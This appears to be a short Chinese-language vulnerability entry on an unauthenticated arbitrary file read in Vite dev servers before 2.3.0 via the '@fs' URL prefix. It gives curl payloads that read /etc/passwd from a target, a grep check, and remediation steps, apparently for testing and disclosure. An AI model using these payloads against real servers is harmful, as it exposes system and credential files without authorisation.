## 漏洞描述

Vite 是一个现代前端构建工具，为 Web 项目提供更快、更精简的开发体验。在 Vite 2.3.0 版本之前，可以通过 `@fs` 前缀读取文件系统上的任意文件。

## 影响版本

- Vite < 2.3.0

## 前置条件

- 无需认证
- 需要能够访问 Vite 开发服务器

## 利用步骤

1. 使用 `@fs` 前缀访问任意文件

## Payload

```bash
# 读取 /etc/passwd
curl "http://target:3000/@fs/etc/passwd"
```

## 验证方法

```bash
# 成功读取文件内容即证明漏洞存在
curl -s "http://target:3000/@fs/etc/passwd" | grep root
```

## 修复建议

1. 升级 Vite 至 2.3.0+
2. 禁用 @fs 前缀功能
3. 限制开发服务器访问来源
